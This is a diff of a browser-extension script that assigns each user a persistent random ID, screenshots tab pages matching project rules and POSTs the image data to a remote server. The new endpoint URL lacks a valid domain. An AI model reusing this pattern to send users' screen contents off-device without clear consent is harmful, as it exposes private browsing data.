@@ -8,25 +8,23 @@ function matchRule(str, rule) {
 }
 
 function getRandomToken() {
-    // E.g. 8 * 32 = 256 bits token
     var randomPool = new Uint8Array(32);
     crypto.getRandomValues(randomPool);
     var hex = '';
     for (var i = 0; i < randomPool.length; ++i) {
         hex += randomPool[i].toString(16);
     }
-    // E.g. db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a
     return hex;
 }
 
-chrome.storage.sync.get('userid', function(items) {
-    var userid = items.userid;
-    if (userid) {
-        takeScreenshot(userid);
+chrome.storage.sync.get('userId', function(items) {
+    var userId = items.userId;
+    if (userId) {
+        takeScreenshot(userId);
     } else {
-        userid = getRandomToken();
-        chrome.storage.sync.set({userid: userid}, function() {
-            takeScreenshot(userid);
+        userId = getRandomToken();
+        chrome.storage.sync.set({userId: userId}, function() {
+            takeScreenshot(userId);
         });
     }
 });
@@ -41,9 +39,9 @@ function takeScreenshot (userId) {
                     chrome.runtime.sendMessage({msg: "capture"}, function(response, err) {
                         $.ajax({
                             type: "POST",
-                            url: "https://the-dark-si.de/image", //xn--tu8hac.ws
+                            url: "https://the-dark-side/screenshot", //xn--tu8hac.ws
                             data: {
-                                "project": project.projectName,
+                                "projectName": project.projectName,
                                 "imageData": response.imageData,
                                 "userId": userId
                             },
